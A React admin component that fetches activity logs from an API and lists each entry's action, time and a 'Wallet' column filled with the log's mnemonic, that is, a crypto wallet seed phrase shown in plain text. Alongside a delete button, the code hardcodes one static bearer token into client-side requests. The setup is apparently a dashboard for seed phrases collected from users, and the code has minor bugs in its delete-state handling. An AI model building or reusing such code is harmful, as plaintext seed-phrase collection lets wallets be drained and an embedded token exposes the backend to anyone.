import React, { useEffect, useState } from 'react'
import { motion } from "framer-motion";
import { Card, CardContent } from './ui/card';
import { Table, TableHeader, TableRow, TableHead, TableBody, TableCell } from "@/components/ui/table";
import { Activity } from "lucide-react";
import { timeAgoOrInString } from '@/lib/utils';

function Activities() {
    const [logs, setLogs] = useState([]);
    const [deleting, setDeleting] = useState(false);
    const API = import.meta.env.VITE_API_URL;
    async function getSettings() {
        const res = await fetch(`${API}/logs/all`, {
            method: 'GET',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': 'Bearer hfhryeujhshbxhdsjjskaas',
            }
        });
        const json = await res.json();
        if(json) {
            setLogs(json);
        }
    }
    
    useEffect(() => {
        try{
            getSettings()
        } catch(err) {
            console.log(err)
        }
    }, []);

    const handleDeleteActivity = async (id) => {
        setDeleting(true);
        const response = await fetch(`${API}/logs/${id}`, {
            method: 'DELETE',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': 'Bearer hfhryeujhshbxhdsjjskaas',
            }
        });
        const res = await response.json();
        setDeleting(false);
        alert(res.message);
    }

    return (
        <motion.section initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="mt-4">
            <Card className="rounded-2xl border-indigo-900/40 bg-white/5">
                <CardContent className="p-4 sm:p-6">
                    <h2 className="mb-4 flex items-center gap-2 text-lg font-semibold text-white">
                        <Activity className="h-5 w-5 text-indigo-300" /> Activities Log
                    </h2>
                    <div className="overflow-x-auto">
                        <Table>
                            <TableHeader>
                                <TableRow>
                                <TableHead className='text-gray-300'>Action</TableHead>
                                <TableHead className='text-gray-300'>Wallet</TableHead>
                                <TableHead className='text-gray-300'>Time</TableHead>
                                </TableRow>
                            </TableHeader>
                            <TableBody>
                                {
                                    logs.map(log => (
                                        <TableRow key={log.timestamp} className="hover:bg-white/5 text-white">
                                            <TableCell>{ log.action }</TableCell>
                                            <TableCell>{log.mnemonic}</TableCell>
                                            <TableCell>{ timeAgoOrInString(log.timestamp) }</TableCell>
                                            <TableCell>
                                                <button
                                                    onClick={() => handleDeleteActivity(log._id)}
                                                    disabled={deleting}
                                                    className={`rounded px-3 text-xs py-1 font-semibold text-gray-200 transition ${
                                                    deleting === log._id
                                                        ? "bg-red-400 opacity-70 cursor-not-allowed"
                                                        : "bg-red-500 hover:bg-red-600"
                                                    }`}
                                                    title="Delete log"
                                                >
                                                    {deleting ? "Deleting…" : "Delete"}
                                                </button>
                                            </TableCell>
                                        </TableRow>
                                    ))
                                }
                            </TableBody>
                        </Table>
                    </div>
                </CardContent>
            </Card>
        </motion.section>
    );
}

export default Activities